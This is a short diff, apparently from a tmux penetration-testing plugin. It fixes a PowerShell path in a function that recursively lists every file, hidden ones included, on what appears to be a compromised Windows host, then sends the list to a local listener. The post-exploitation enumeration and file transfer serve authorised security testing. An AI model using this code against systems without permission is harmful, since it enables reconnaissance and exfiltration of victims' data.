@@ -56,10 +56,10 @@ _fetch_file_list() {
   local lport="$(penmux_module_get_option "$_MODULE_PATH" "LocalTempPort" "$pane_id")"
   local files="$(mktemp)"
 
-  tmux send-keys -t "$pane_id" 'Get-ChildItem -File -recurse | Select Name -ExpandProperty FullName > $TEMP\fl.txt' Enter
-  tmux send-keys -t "$pane_id" 'Get-ChildItem -Hidden -File -recurse | Select Name -ExpandProperty FullName >> $TEMP\fl.txt' Enter
+  tmux send-keys -t "$pane_id" 'Get-ChildItem -File -recurse | Select Name -ExpandProperty FullName > $env:TEMP\fl.txt' Enter
+  tmux send-keys -t "$pane_id" 'Get-ChildItem -Hidden -File -recurse | Select Name -ExpandProperty FullName >> $env:TEMP\fl.txt' Enter
 
-  _fetch_file "$pane_id" '$TEMP\fl.txt' "$files" "$lhost" "$lport"
+  _fetch_file "$pane_id" '$env:TEMP\fl.txt' "$files" "$lhost" "$lport"
 
   dos2unix "$files" > /dev/null
 
